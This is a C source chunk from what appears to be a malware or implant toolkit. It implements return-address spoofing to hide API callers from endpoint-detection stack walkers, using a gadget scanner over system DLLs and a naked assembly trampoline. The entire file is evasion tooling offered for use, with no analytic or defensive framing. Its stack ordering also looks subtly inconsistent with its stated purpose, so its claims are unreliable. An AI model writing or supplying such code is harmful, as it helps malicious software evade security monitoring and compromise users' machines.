// chunk: evasion/ret_spoof
// depends: (none)
// provides: init_ret_spoof, spoofed_call
// headers: windows.h
// note: Return address spoofing — hides the true caller from EDR stack walkers.
//       Scans loaded modules for a jmp rbx gadget, uses it to trampoline API calls
//       so the return address on the stack points to legitimate code.

#ifndef CHUNK_RET_SPOOF
#define CHUNK_RET_SPOOF

static void *g_spoof_gadget = NULL;
static void *g_spoof_fixup = NULL;

static void *find_gadget_in_module(HMODULE mod, BYTE *pattern, int pat_len) {
    if (!mod) return NULL;
    BYTE *base = (BYTE *)mod;
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (!(sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)) continue;
        BYTE *start = base + sec[i].VirtualAddress;
        DWORD size = sec[i].Misc.VirtualSize;
        for (DWORD j = 0; j + (DWORD)pat_len <= size; j++) {
            int match = 1;
            for (int k = 0; k < pat_len; k++) {
                if (start[j + k] != pattern[k]) { match = 0; break; }
            }
            if (match) return (void *)(start + j);
        }
    }
    return NULL;
}

static int init_ret_spoof(void) {
    BYTE jmp_rbx[] = { 0xFF, 0xE3 };
    HMODULE mods[] = {
        GetModuleHandleA("ntdll.dll"),
        GetModuleHandleA("kernel32.dll"),
        GetModuleHandleA("kernelbase.dll"),
    };
    for (int i = 0; i < 3; i++) {
        g_spoof_gadget = find_gadget_in_module(mods[i], jmp_rbx, 2);
        if (g_spoof_gadget) break;
    }
    g_spoof_fixup = (void *)GetProcAddress(
        GetModuleHandleA("kernel32.dll"), "BaseThreadInitThunk");
    return (g_spoof_gadget != NULL) ? 1 : 0;
}

typedef ULONG_PTR (*fn_generic_t)();

/*
 * Naked trampoline: rcx=fn, rdx=gadget, r8=fake_ret, r9=args_array, [rsp+0x28]=nargs
 * Spoofs the return address so EDR stack walkers see fake_ret as the caller.
 */
__attribute__((naked))
static ULONG_PTR _spoofed_tramp(
    void *fn, void *gadget, void *fake_ret, ULONG_PTR *args, int nargs) {
    __asm__ __volatile__ (
        "push %%rbp\n\t"
        "mov %%rsp, %%rbp\n\t"
        "push %%rbx\n\t"
        "push %%rsi\n\t"
        "push %%rdi\n\t"
        "push %%r12\n\t"
        "push %%r13\n\t"
        "push %%r14\n\t"
        "sub $8, %%rsp\n\t"

        "mov %%rcx, %%r12\n\t"
        "mov %%rdx, %%r13\n\t"
        "mov %%r8, %%r14\n\t"
        "mov %%r9, %%rsi\n\t"
        "mov 0x30(%%rbp), %%edi\n\t"

        "sub $0x60, %%rsp\n\t"

        "xor %%rcx, %%rcx\n\t"
        "xor %%rdx, %%rdx\n\t"
        "xor %%r8, %%r8\n\t"
        "xor %%r9, %%r9\n\t"
        "cmp $1, %%edi\n\t"
        "jl 2f\n\t"
        "mov 0(%%rsi), %%rcx\n\t"
        "cmp $2, %%edi\n\t"
        "jl 2f\n\t"
        "mov 8(%%rsi), %%rdx\n\t"
        "cmp $3, %%edi\n\t"
        "jl 2f\n\t"
        "mov 16(%%rsi), %%r8\n\t"
        "cmp $4, %%edi\n\t"
        "jl 2f\n\t"
        "mov 24(%%rsi), %%r9\n\t"

        "cmp $5, %%edi\n\t"
        "jl 2f\n\t"
        "mov 32(%%rsi), %%rax\n\t"
        "mov %%rax, 32(%%rsp)\n\t"
        "cmp $6, %%edi\n\t"
        "jl 2f\n\t"
        "mov 40(%%rsi), %%rax\n\t"
        "mov %%rax, 40(%%rsp)\n\t"
        "cmp $7, %%edi\n\t"
        "jl 2f\n\t"
        "mov 48(%%rsi), %%rax\n\t"
        "mov %%rax, 48(%%rsp)\n\t"
        "cmp $8, %%edi\n\t"
        "jl 2f\n\t"
        "mov 56(%%rsi), %%rax\n\t"
        "mov %%rax, 56(%%rsp)\n\t"
        "cmp $9, %%edi\n\t"
        "jl 2f\n\t"
        "mov 64(%%rsi), %%rax\n\t"
        "mov %%rax, 64(%%rsp)\n\t"
        "cmp $10, %%edi\n\t"
        "jl 2f\n\t"
        "mov 72(%%rsi), %%rax\n\t"
        "mov %%rax, 72(%%rsp)\n\t"

        "2:\n\t"
        "mov %%r12, %%rbx\n\t"
        "push %%r14\n\t"
        "lea 3f(%%rip), %%rax\n\t"
        "push %%rax\n\t"
        "jmp *%%r13\n\t"

        "3:\n\t"
        "add $8, %%rsp\n\t"
        "add $0x60, %%rsp\n\t"

        "add $8, %%rsp\n\t"
        "pop %%r14\n\t"
        "pop %%r13\n\t"
        "pop %%r12\n\t"
        "pop %%rdi\n\t"
        "pop %%rsi\n\t"
        "pop %%rbx\n\t"
        "pop %%rbp\n\t"
        "ret\n\t"
        ::: "memory"
    );
}

static ULONG_PTR spoofed_call(void *fn, int nargs, ...) {
    va_list ap;
    va_start(ap, nargs);
    ULONG_PTR a[10] = {0};
    for (int i = 0; i < nargs && i < 10; i++)
        a[i] = va_arg(ap, ULONG_PTR);
    va_end(ap);

    if (!g_spoof_gadget || !fn)
        return ((fn_generic_t)fn)(a[0],a[1],a[2],a[3],a[4],a[5],a[6],a[7],a[8],a[9]);

    return _spoofed_tramp(fn, g_spoof_gadget, g_spoof_fixup, a, nargs);
}

#endif
